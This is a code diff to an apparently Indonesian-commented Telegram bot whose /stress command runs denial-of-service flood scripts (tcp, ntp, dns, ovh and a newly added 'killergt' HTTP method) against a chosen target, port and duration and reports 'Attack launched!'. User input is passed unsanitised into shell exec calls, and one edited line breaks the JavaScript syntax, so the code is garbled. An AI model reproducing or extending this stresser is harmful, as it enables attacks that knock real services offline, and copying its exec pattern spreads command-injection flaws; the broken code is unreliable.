@@ -364,13 +364,10 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
       break;
       case 'tcp':
       exec(`node methods/tcp.js ${target} ${port} ${duration}`)
+      exec(`node methods/killergt.js http://${target}/ ${port} ${duration}`)
       exec(`node methods/ntp.js ${target} ${port} ${duration}`)
       exec(`node methods/dns.js ${target} ${port} ${duration}`)
       exec(`node methods/ovh.js ${target} ${port} ${duration}`)
-      exec(`node methods/ntp.js ${target} ${port} ${duration}`)
-      break;
-    case 'tcp':
-      command = `node methods/tcp.js ${target} ${port} ${duration}`
       break;
     case 'dns':
       command = `node methods/dns.js ${target} ${port} ${duration}`
@@ -392,8 +389,7 @@ bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
   // Kirim pesan bahwa attack telah diluncurkan
   bot.sendMessage(chatId, `\`\`\`Attack Attack launched!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\nPort: ${port}\`\`\``, { parse_mode: 'Markdown' });
   
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
+  exec(command, (error, stdout, stderr) =   if (error) {
       const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
       bot.sendMessage(chatId, errorMessage);
       logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
